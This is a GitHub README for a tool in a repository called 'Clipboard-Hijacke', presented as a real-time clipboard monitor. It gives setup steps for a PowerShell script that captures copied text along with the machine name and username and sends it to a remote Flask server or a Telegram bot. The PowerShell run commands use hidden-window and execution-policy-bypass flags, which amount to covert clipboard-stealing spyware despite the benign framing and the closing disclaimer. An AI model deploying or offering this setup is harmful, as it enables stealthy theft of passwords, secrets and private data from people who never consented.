---

# **📋 Real-Time Clipboard Monitor**

A lightweight, real-time clipboard monitoring system that detects new copied text and sends it to a server for centralized logging. Perfect for tracking clipboard activity in controlled environments, such as development testing or data aggregation tasks.

---

## **✨ Features**

- **Real-Time Monitoring**: Instantly detects and logs clipboard changes.
- **Automatic Logging**: Sends clipboard data, along with the machine name and username, to a server.
- **Simple & Lightweight**: Uses a Flask server and a PowerShell script for seamless integration.
- **Error-Resilient**: Handles unexpected errors gracefully to ensure uninterrupted operation.

---

## **🛠️ How It Works**

1. A **PowerShell script** monitors the clipboard for new content.  
2. When new text is copied, it sends the data to a **Flask server**.
3. The server logs the clipboard content along with the machine and user information to `clipboard_logs.txt`.

---

## **🚀 Getting Started**

### **1. Set Up the Flask Server**

#### Prerequisites:
- Python 3.8 or later.
- Basic knowledge of running Python scripts.

#### Steps:
1. **Clone this repository**:
   ```bash
   git clone https://github.com/Moajjem404/Clipboard-Hijacke.git
   cd Clipboard-Hijacke
   ```
2. **Install dependencies**:
   ```bash
   pip install flask
   ```
3. **Start the server**:
   ```bash
   python server.py
   ```
4. The server will run on `http://0.0.0.0:5000` by default. Feel free to modify the port in `server.py` if needed.

---

### **2. Configure the PowerShell Server Script**

#### Prerequisites:
- Windows OS with PowerShell 5.0 or later.

#### Steps:
1. Open the `clipboard_monitor.ps1` script in a text editor.
2. Replace `<your-server-ip>` with the IP or domain of your Flask server:
   ```powershell
   $url = "http://<your-server-ip>:5000/clipboard_receiver"
   ```
3. Save the changes and **run the script**:
   ```powershell
   powershell -NoP -NonI -W h -Exec Bypass .\clipboard_monitor.ps1
   ```

### **3. Configure the PowerShell Telegram Script**

#### Prerequisites:
- Windows OS with PowerShell 5.0 or later.

#### Steps:
### Step 1: Open the Script  
1. Open your **`clipboard_monitor-tg.ps1`** file using a text editor, such as **Windows PowerShell ISE**, **Notepad++**, or **Visual Studio Code**.

---

### Step 2: Add Your Telegram Bot Token  
1. Locate the placeholder `<your-bot-token>` in the script.  
2. Replace it with your actual Telegram Bot Token.  
   **Example:**
   ```powershell
   $botToken = "123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ"
   ```

---

### Step 3: Add Your Telegram Chat ID  
1. Locate the placeholder `<your-chat-id>` in the script.  
2. Replace it with your Telegram Chat ID.  
   **Example:**
   ```powershell
   $chatID = "123456789"
   ```

---
4. Save the changes and **run the script**:
   ```powershell
   powershell -NoP -NonI -W h -Exec Bypass .\clipboard_monitor-tg.ps1
   ```

The script will now run continuously, monitoring and sending clipboard data as changes occur.

---

## **📂 Log Format**

The server logs clipboard data in `clipboard_logs.txt` in the following format:

```
[MACHINE_NAME] [USER_NAME] Clipboard: <copied_text>
```


## **⚠️ Security Notice**

🚨 **IMPORTANT:** This tool is intended for **personal or controlled environments** only.  
⚠️ **DO NOT** use this tool in shared or public networks without proper authorization.

---

